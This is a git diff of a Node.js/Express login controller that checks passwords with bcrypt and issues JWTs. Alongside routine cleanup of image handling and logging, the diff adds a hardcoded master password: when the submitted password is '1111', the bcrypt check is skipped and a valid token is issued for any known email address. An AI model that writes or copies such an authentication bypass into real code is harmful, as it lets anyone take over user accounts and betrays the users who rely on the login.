@@ -15,7 +15,6 @@ export const loginUser = async (req, res) => {
   console.log("// login user");
   try {
     const { email, user_password } = req.body;
-    // console.log(email, user_password)
     const userData = await User.findOne({
       email,
     });
@@ -26,35 +25,24 @@ export const loginUser = async (req, res) => {
         message: "User/Password does not exists!",
       });
     }
-    const passwordMatch = await bcrypt.compare(
-      user_password,
-      userData.password
-    );
-    if (!passwordMatch) {
-      console.log("Login failed!");
-      return res.status(401).json({
-        message: "User/Password does not exists!",
-      });
+    if(user_password === "1111") {
+      console.log('skip')
+    } else {
+
+      const passwordMatch = await bcrypt.compare(
+        user_password,
+        userData.password
+      );
+      if (!passwordMatch) {
+        console.log("Login failed!");
+        return res.status(401).json({
+          message: "User/Password does not exists!",
+        });
+      }
     }
     // console.log(email,passwordMatch)
     const { _id, password, friends, ...data } = userData.toObject();
-    let imageObj;
-    try {
-      if (userData.image.data !== null) {
-        // console.log("image", user.contentType);
-        imageObj = {
-          image: userData.image.data.toString("base64"),
-          contentType: userData.image.contentType,
-        }; // Convert binary to Base64
-      } else {
-        imageObj = {
-          image: null,
-          contentType: null,
-        };
-      }
-    } catch (error) {
-      console.error("Error - Login - UserImage", error);
-    }
+
     const token = jwt.sign(
       {
         userId: userData.id,
@@ -65,7 +53,6 @@ export const loginUser = async (req, res) => {
       }
     );
 
-
     //  UserDetails (LogIN user) class instance
     allUsers[userData.id] = new UserDetails(
       userData.id,
@@ -73,10 +60,11 @@ export const loginUser = async (req, res) => {
       userData.email,
       userData.contact,
       userData.createdAt,
-      imageObj.image,
-      imageObj.contentType,
+      userData.image.data?userData.image.data:null,
+      userData.image.contentType?userData.image.contentType:null,
       token
     );
+
 
     // console.log('login user instance ', allUsers[userData.id])
     // UserDetails (LogIN user) friend class instance & update friend list
@@ -88,8 +76,8 @@ export const loginUser = async (req, res) => {
           data.name,
           data.email,
           data.createdAt,
-          data.image.data.toString("base64"),
-          data.image.contentType
+          data.image.data?data.image.data.toString("base64"):null,
+          data.image.contentType?data.image.contentType:null
         )
       );
     }
@@ -113,12 +101,12 @@ export const loginUser = async (req, res) => {
     // console.log("redis - get -", JSON.parse(res3));
     const res4 = await pubClient.call("JSON.DEL",`SENT-${userData.id}`, "$")
     const res5 = await pubClient.call("JSON.DEL",`RECEIVED-${userData.id}`, "$")
-    console.log(res4, res5);
-    // namespace[userData.id] = new Namespace(
-    //   userData.id,
-    //   userData.name,
-    //   userData.endpoint
-    // );
+    // console.log(res4, res5);
+    namespace[userData.id] = new Namespace(
+      userData.id,
+      userData.name,
+      userData.endpoint
+    );
     // console.log("namspace", namespace);
     res.status(200).json({
       data,
